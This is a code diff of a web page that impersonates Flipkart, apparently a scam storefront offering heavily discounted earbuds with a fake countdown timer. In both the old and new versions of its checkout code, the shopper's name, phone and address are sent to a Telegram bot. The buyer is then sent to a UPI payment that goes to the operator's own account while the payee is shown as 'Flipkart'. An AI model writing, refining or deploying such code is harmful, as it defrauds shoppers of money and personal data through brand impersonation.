@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -431,152 +430,121 @@
             { id: 38, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] },
             { id: 39, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] }
         ];
+let sel = null;
+    let swpDet;
 
-        let sel = null;
-        let swpDet;
-
-        function init() {
-    const grid = document.getElementById('main-grid');
-    grid.innerHTML = ''; // Clear old content
-    products.forEach(p => {
-        grid.innerHTML += `
-        <div class="bg-white p-2 border-[0.5px] border-gray-200 flex flex-col cursor-pointer" onclick="openProduct(${p.id})">
-            <div class="relative">
-                <img src="${p.imgs[0]}" class="h-72 w-full object-contain mx-auto">
-                <i class="fa-regular fa-heart absolute top-1 right-1 text-gray-400"></i>
-            </div>
-            <p class="text-xs mt-3 line-clamp-1 text-gray-700">${p.name}</p>
-            <div class="flex items-center gap-1 mt-1">
-                <span class="bg-green-700 text-white text-[9px] px-1 rounded flex items-center gap-0.5">4.4 <i class="fa-solid fa-star text-[7px]"></i></span>
-                <span class="text-gray-400 text-[9px] font-medium">(2,105)</span>
-                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_9e47c1.png" class="h-3 ml-auto">
-            </div>
-            <div class="flex items-center gap-1.5 mt-1">
-                <span class="font-bold text-sm">₹${p.price}</span>
-                <span class="text-gray-400 line-through text-[10px]">₹${p.mrp}</span>
-                <span class="text-green-600 text-[10px] font-bold">99% off</span>
-            </div>
-            <p class="text-[10px] text-gray-800 mt-0.5">Free delivery</p>
-            <p class="text-[10px] text-green-700 font-bold">Daily Saver</p>
-        </div>`;
-    });
-}
-      function startTimer() {
-    // Hum 8 ghante ka countdown set kar rahe hain
-    let hours = 00, minutes = 10, seconds = 0;
-
-    setInterval(() => {
-        if (seconds > 0) seconds--;
-        else {
-            seconds = 59;
-            if (minutes > 0) minutes--;
+    function startTimer() {
+        let hours = 0, minutes = 10, seconds = 0;
+        setInterval(() => {
+            if (seconds > 0) seconds--;
             else {
-                minutes = 59;
-                if (hours > 0) hours--;
+                seconds = 59;
+                if (minutes > 0) minutes--;
+                else {
+                    minutes = 59;
+                    if (hours > 0) hours--;
+                }
             }
-        }
+            if(document.getElementById('t-hours')) {
+                document.getElementById('t-hours').innerText = hours.toString().padStart(2, '0');
+                document.getElementById('t-min').innerText = minutes.toString().padStart(2, '0');
+                document.getElementById('t-sec').innerText = seconds.toString().padStart(2, '0');
+            }
+        }, 1000);
+    }
 
-        // DOM update karna
-        document.getElementById('t-hours').innerText = hours.toString().padStart(2, '0');
-        document.getElementById('t-min').innerText = minutes.toString().padStart(2, '0');
-        document.getElementById('t-sec').innerText = seconds.toString().padStart(2, '0');
-    }, 1000);
-}
+    function init() {
+        const grid = document.getElementById('main-grid');
+        grid.innerHTML = ''; 
+        products.forEach(p => {
+            grid.innerHTML += `
+            <div class="bg-white p-2 border-[0.5px] border-gray-200 flex flex-col cursor-pointer" onclick="openProduct(${p.id})">
+                <div class="relative">
+                    <img src="${p.imgs[0]}" class="h-72 w-full object-contain mx-auto">
+                </div>
+                <p class="text-xs mt-3 line-clamp-1 text-gray-700">${p.name}</p>
+                <div class="flex items-center gap-1.5 mt-1">
+                    <span class="font-bold text-sm">₹${p.price}</span>
+                    <span class="text-gray-400 line-through text-[10px]">₹${p.mrp || ''}</span>
+                </div>
+            </div>`;
+        });
+        startTimer();
+        
+        // Home Banner Swiper Auto-play logic
+        new Swiper(".home-swiper", {
+            pagination: { el: ".swiper-pagination" },
+            autoplay: { delay: 2500 },
+            loop: true
+        });
+    }
 
-// init function ke andar ise call karein
-const originalInit = init;
-init = function() {
-    originalInit();
-    startTimer();
-};
-        function showPage(id) {
-            ['page-home', 'page-detail', 'page-address', 'page-summary', 'page-payment'].forEach(p => {
-                document.getElementById(p).classList.add('hidden');
-            });
-            document.getElementById(id).classList.remove('hidden');
-            window.scrollTo(0,0);
-        }
+    function showPage(id) {
+        ['page-home', 'page-detail', 'page-address', 'page-summary', 'page-payment'].forEach(p => {
+            document.getElementById(p).classList.add('hidden');
+        });
+        document.getElementById(id).classList.remove('hidden');
+        window.scrollTo(0,0);
+    }
 
-        function openProduct(id) {
-            sel = products.find(p => p.id === id);
-            document.getElementById('det-name').innerText = sel.name;
-            document.getElementById('det-price').innerText = "₹" + sel.price;
-            document.getElementById('det-mrp').innerText = "₹" + sel.mrp;
-            
-            // Image Slider
-            const swpWrapper = document.getElementById('swiper-images');
-            swpWrapper.innerHTML = '';
-            sel.imgs.forEach(url => {
-                swpWrapper.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
-            });
+    function openProduct(id) {
+        sel = products.find(p => p.id === id);
+        document.getElementById('det-name').innerText = sel.name;
+        document.getElementById('det-price').innerText = "₹" + sel.price;
+        document.getElementById('det-mrp').innerText = "₹" + (sel.mrp || '');
+        
+        const swpWrapper = document.getElementById('swiper-images');
+        swpWrapper.innerHTML = '';
+        sel.imgs.forEach(url => {
+            swpWrapper.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
+        });
 
-            // Product Description Stack (Using descImgs if available, else imgs)
-            const fS = document.getElementById('full-stack-images');
-            fS.innerHTML = ''; 
-            const dPhotos = (sel.descImgs && sel.descImgs.length > 0) ? sel.descImgs : sel.imgs;
-            dPhotos.forEach(url => {
-                fS.innerHTML += `<img src="${url}" class="w-full">`;
-            });
+        const fS = document.getElementById('full-stack-images');
+        fS.innerHTML = ''; 
+        const dPhotos = (sel.descImgs && sel.descImgs.length > 0) ? sel.descImgs : sel.imgs;
+        dPhotos.forEach(url => {
+            fS.innerHTML += `<img src="${url}" class="w-full">`;
+        });
 
-            showPage('page-detail');
-            if(swpDet) swpDet.destroy();
-            swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
-        }
+        showPage('page-detail');
+        if(swpDet) swpDet.destroy();
+        swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
+    }
 
-        function goToSummary() {
-            if(document.getElementById('uName').value && document.getElementById('uPhone').value) {
-                document.getElementById('sum-mrp').innerText = "₹" + (sel.mrp || "5,000");
-                document.getElementById('sum-total').innerText = "₹" + sel.price;
-                showPage('page-summary');
-            } else { alert("Please fill all details"); }
-        }
-
-        async function fetchPin(pin) {
-            if(pin.length === 6) {
+    async function fetchPin(pin) {
+        if(pin.length === 6) {
+            try {
                 const r = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
                 const d = await r.json();
                 if(d[0].Status === "Success") {
                     document.getElementById('uCity').value = d[0].PostOffice[0].District;
                     document.getElementById('uState').value = d[0].PostOffice[0].State;
                 }
-            }
+            } catch(e) {}
         }
-
-        async function confirmPay() {
-    // Sari details collect karna
-    const name = document.getElementById('uName').value;
-    const phone = document.getElementById('uPhone').value;
-    const pincode = document.getElementById('uPin').value;
-    const city = document.getElementById('uCity').value;
-    const address = document.getElementById('uAdd').value;
-
-    // Message format for Telegram
-    const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
-                `📦 *Item:* ${sel.name}\n` +
-                `💰 *Price:* ₹${sel.price}\n\n` +
-                `👤 *Name:* ${name}\n` +
-                `📞 *Phone:* ${phone}\n` +
-                `📍 *Pin:* ${pincode}\n` +
-                `🏙️ *City:* ${city}\n` +
-                `🏠 *Add:* ${address}`;
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-
-    try {
-        await fetch(url);
-    } catch (e) {
-        console.log("Telegram failed but moving to payment");
     }
 
-    // --- UPDATED UPI LINK WITH MESSAGE ---
-    // Note: Isse UPI ID ke niche message dikhega
-    const upiNote = encodeURIComponent(`Order: ${sel.name.substring(0, 15)} by ${name}`);
-    
-    window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR&tn=${upiNote}`;
-}
+    function goToSummary() {
+        if(document.getElementById('uName').value && document.getElementById('uPhone').value) {
+            document.getElementById('sum-mrp').innerText = "₹" + (sel.mrp || "5,000");
+            document.getElementById('sum-total').innerText = "₹" + sel.price;
+            document.getElementById('sum-total-bottom').innerText = "₹" + sel.price;
+            showPage('page-summary');
+        } else { alert("Please fill all details"); }
+    }
 
-// Ye line hamesha last mein rehni chahiye
-init();
-    </script>
+    async function confirmPay() {
+        const name = document.getElementById('uName').value;
+        const phone = document.getElementById('uPhone').value;
+        const msg = `🔥 *NEW ORDER* 🔥\n📦 ${sel.name}\n💰 ₹${sel.price}\n👤 ${name}\n📞 ${phone}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+
+        const upiString = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR&tn=Order_${name}`;
+        window.location.href = upiString;
+    }
+
+    init();
+</script>
 </body>
 </html> 
